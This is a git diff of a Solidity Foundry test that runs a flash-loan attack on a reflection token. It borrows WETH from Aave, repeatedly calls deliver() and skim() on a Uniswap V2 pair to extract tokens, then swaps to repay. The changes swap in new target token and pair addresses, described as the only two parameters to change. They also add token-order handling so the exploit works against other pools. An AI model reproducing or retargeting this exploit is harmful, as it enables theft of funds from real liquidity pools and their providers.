@@ -23,9 +23,11 @@ contract CounterTest is  IFlashLoanReceiver, Test {
     address public WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;//Main 
     address public WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;//Main
     address public USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7; //Main
-    address public REFLACTION = 0x71959A1688beb7ff73F39D356414f47F54B9FD1f;
 
-    address public PAIR = 0xF4D3B484defEd381dc4D686C761aEd23431083C3;
+    //Only have these two paramitors:
+    address public REFLACTION = 0x5F74EC2EB0b1e625960aDEB717cc386b60FB0DC2;
+    address public PAIR = 0x83122b284E4dA41dEcAD8450120fDa258138d9c6;
+
     address public AAVE_POOLV2 = 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9;//Main  
     address public uniswapRouterV202 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
 
@@ -47,7 +49,7 @@ contract CounterTest is  IFlashLoanReceiver, Test {
 
     function testTrade() public {
 
-        uint256 weth_amount = 200*10**18;
+        uint256 weth_amount = 200*10**18 / 100;
         weth.approve(AAVE_POOLV2, uint256(2**256-1));
 
         address[] memory assets = new address[](1);
@@ -86,7 +88,12 @@ contract CounterTest is  IFlashLoanReceiver, Test {
         reflaction.deliver(balanceOfThis(REFLACTION));
         pair.skim(address(this));
         reflaction.deliver(balanceOfThis(REFLACTION));
-        pair.swap((amounts[0]+premiums[0]), 0, address(this), hex"");
+        address token0 = pair.token0();
+        if( token0 == WETH){
+            pair.swap((amounts[0]+premiums[0]), 0, address(this), hex"");
+        }else{
+            pair.swap(0, (amounts[0]+premiums[0]), address(this), hex"");
+        }       
         
         return true;
     }
@@ -107,6 +114,8 @@ contract CounterTest is  IFlashLoanReceiver, Test {
     //     require(_success);
     //     return _result;
     // }
+
+    // function redeemAllowed(address cToken, address redeemer, uint redeemTokens) external returns (uint);
 
     receive()external payable {}
 }
